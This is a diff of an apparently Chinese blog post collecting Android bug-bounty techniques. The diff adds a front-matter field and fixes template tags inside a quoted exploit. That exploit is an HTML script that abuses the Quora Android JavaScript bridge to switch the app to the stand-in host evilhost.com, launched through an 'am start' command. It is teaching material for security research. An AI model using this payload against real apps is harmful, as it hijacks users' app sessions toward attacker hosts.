@@ -2,6 +2,7 @@
 title: 安卓App漏洞挖掘手法知识库
 date: '2026-01-19 16:39:27'
 updated: '2026-01-19 16:43:15'
+abbrlink: 8acde52c
 ---
 <!--more--> 
 原文：[https://github.com/s7safe/android-h1](https://github.com/s7safe/android-h1)
@@ -814,7 +815,7 @@ am start -n com.quora.android/com.quora.android.ModalContentActivity \
 ```html
 <script>
 QuoraAndroid.sendMessage(
-"{\"messageName\":\"switchInstance\",\"data\":{\"host\":\"evilhost.com\",\"instance_name\":\"evilhost\",\"scheme\":\"https\"}}{% endraw %}"
+"{\"messageName\":\"switchInstance\",\"data\":{\"host\":\"evilhost.com\",\"instance_name\":\"evilhost\",\"scheme\":\"https\"{% raw %}}}{% endraw %}"
 );
 </script>
 
